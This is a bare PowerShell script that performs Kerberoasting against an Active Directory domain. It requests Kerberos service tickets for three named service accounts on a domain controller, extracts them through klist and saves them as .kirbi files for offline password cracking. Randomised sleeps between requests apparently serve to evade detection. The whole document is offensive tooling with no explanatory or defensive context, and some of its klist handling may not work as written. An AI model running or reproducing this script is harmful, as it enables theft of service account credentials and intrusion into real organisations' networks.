Add-Type -AssemblyName System.IdentityModel

$users = @("sqlservice", "http_service", "backup_svc")

foreach ($user in $users) {
    try {
        $spn = "$user/dc01.domain.com"
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
        Write-Host "[+] TGS requested for: $spn" -ForegroundColor Green
        
        Start-Sleep -Seconds 3
        
        $output = klist get "$spn" /base64 2>$null
        if ($output) {
            $ticketBase64 = $output | Select-String -Pattern "^[A-Za-z0-9+/]{20,}"
            if ($ticketBase64) {
                $filename = "$user-$(Get-Date -Format 'yyyyMMddHHmmss').kirbi"
                [System.IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($ticketBase64.ToString()))
                Write-Host "[+] Ticket saved: $filename" -ForegroundColor Green
            }
        }
    }
    catch {
        Write-Warning "[-] Failed for: $user - $($_.Exception.Message)"
    }
    Start-Sleep -Seconds (Get-Random -Minimum 8 -Maximum 15)
}
